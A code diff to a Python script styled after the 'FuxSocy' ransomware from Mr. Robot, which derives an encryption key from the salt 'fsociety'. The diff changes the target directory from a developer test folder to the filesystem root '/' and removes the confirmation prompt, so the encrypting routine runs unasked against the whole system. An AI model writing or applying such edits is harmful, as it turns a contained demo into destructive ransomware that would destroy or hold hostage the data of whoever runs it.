@@ -1,4 +1,4 @@
-#!/usr/local/bin/python3
+#!/usr/bin/python3
 
 import os
 import time
@@ -10,7 +10,7 @@ from Crypto import Random
 from random import SystemRandom
 from string import ascii_letters, digits, punctuation
 
-START_DIR = '/Users/developer/test_dir'
+START_DIR = '/'
 SALT = 'fsociety'
 CS = 64*1024
 
@@ -95,10 +95,6 @@ def update_progress(progress):
 
 
 def pwn():
-    # f = open('fsociety01.dat', 'r')
-    # for line in f:
-    #     time.sleep(0.03)
-    #     print(line, end='')
     subprocess.call('clear')
     print('Executing FuxSocy')
     key = gen_key(SALT)
@@ -120,11 +116,5 @@ def pwn():
     exit(0)
 
 
-def main():
-    if input('Are you sure? (y/N) ') == 'y':
-        pwn()
-    else:
-        exit(0)
-
 if __name__ == '__main__':
-    main()
+    pwn()
